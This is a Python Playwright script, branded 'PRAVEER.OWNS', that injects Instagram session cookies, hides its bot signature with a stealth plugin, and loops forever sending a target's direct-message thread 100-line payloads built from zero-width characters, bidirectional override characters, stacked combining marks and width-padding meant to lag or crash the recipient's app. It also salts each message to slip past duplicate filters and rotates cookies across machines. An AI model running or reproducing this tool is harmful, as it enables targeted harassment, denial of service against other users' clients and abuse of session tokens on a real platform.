# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (PLAYWRIGHT EDITION)
# 📅 STATUS: ASYNC-STRIKE | STEALTH-V4 | 100-LINE PAPA

import os, asyncio, random, sys
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async

def get_kernel_stop_payload(target_name):
    u_id = random.randint(10000, 99999)
    # Adding unique salt to bypass ghosting filters
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=8))
    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
    
    z_tower = "̸" * 30 # Balanced for 100 lines
    width_bomb = "\u2800\u00A0" * 40
    lines = [header]
    for i in range(100):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("ABC123", k=3))
        lines.append(f"{width_bomb}{prefix}ＰＡＰＡ_{noise}{z_tower}")
    return "\n".join(lines)[:9990]

async def agent_blitz(machine_id, cookie_list, target_id, target_name):
    cookie_index = (machine_id - 1) % len(cookie_list)
    current_cookie = cookie_list[cookie_index].strip()

    async with async_playwright() as p:
        # 🚀 Launching a high-performance Chromium instance
        browser = await p.chromium.launch(headless=True)
        # 🎭 Context Isolation (Mimics a clean incognito session)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        
        # 🛡️ APPLY STEALTH (Hides the bot signature)
        await stealth_async(page)
        
        try:
            print(f"📡 [M{machine_id}] Injecting Session ID...")
            # visit robots.txt to set domain context
            await page.goto("https://www.instagram.com/robots.txt")
            await context.add_cookies([{
                "name": "sessionid",
                "value": current_cookie,
                "domain": ".instagram.com",
                "path": "/",
                "secure": True
            }])

            print(f"📡 [M{machine_id}] Locking Target...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="networkidle")
            
            # ⏳ Smart Wait for the textbox
            await page.wait_for_selector("//div[@role='textbox']", timeout=60000)

            while True:
                # 🔥 DOUBLE-TAP PULSE
                for _ in range(2):
                    payload = get_kernel_stop_payload(target_name)
                    # Playwright handles complex text injection much faster than Selenium
                    await page.fill("//div[@role='textbox']", payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M{machine_id}] Playwright Pulse Delivered.")
                    await asyncio.sleep(2)

                # Stealth Jitter (15-20s)
                await asyncio.sleep(random.uniform(15, 20))

                # Periodic Memory Flush
                if random.random() < 0.1:
                    await page.reload(wait_until="networkidle")

        except Exception as e:
            print(f"⚠️ [M{machine_id}] Error: {str(e)[:50]}. Restarting machine...")
            await browser.close()
            sys.exit(1)

if __name__ == "__main__":
    m_id = int(os.environ.get("MACHINE_ID", "1"))
    cookies = os.environ.get("SESSION_ID", "").split(",")
    t_id = os.environ.get("GROUP_URL", "").strip()
    t_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
